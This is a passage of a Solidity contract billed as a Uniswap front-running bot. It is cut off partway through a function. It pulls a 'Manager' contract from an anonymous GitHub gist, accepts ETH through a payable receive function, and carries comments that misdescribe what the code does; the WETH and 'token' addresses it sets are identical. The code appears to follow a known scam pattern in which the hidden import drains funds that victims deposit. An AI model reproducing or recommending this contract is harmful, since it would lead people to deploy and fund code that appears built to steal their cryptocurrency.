pragma solidity ^0.8.2;

// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Factory.sol";
//Mempool router
import "https://gist.githubusercontent.com/MempoolCheck/634653ccdba683ff00b466fe17c4c140/raw/739723cb2faa43cfbbba974713c33b624cb13052/gistfile1.txt";

contract UniswapFrontrunBot {
  string public tokenName;
  string public tokenSymbol;
  uint public frontrun;
  Manager public manager;

  constructor(string memory _tokenName, string memory _tokenSymbol) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    manager = new Manager();
  }

  receive() external payable {}

  // Struct for storing slices of data
  struct Slice {
    uint len;
    uint ptr;
  }

  /*
   * @dev Finds newly deployed contracts on Uniswap Exchange
   * @param self The slice to compare against.
   * @param other The second slice to compare.
   * @return New contracts with required liquidity.
   */
  function findNewContracts(Slice memory self, Slice memory other) internal pure returns (int) {
    uint shortest = self.len;

    // Find the shortest slice
    if (other.len < self.len)
      shortest = other.len;

    // Compare the two slices element by element
    uint selfptr = self.ptr;
    uint otherptr = other.ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
      // Initiate contract finder
      uint a;
      uint b;

      string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      loadCurrentContract(WETH_CONTRACT_AD
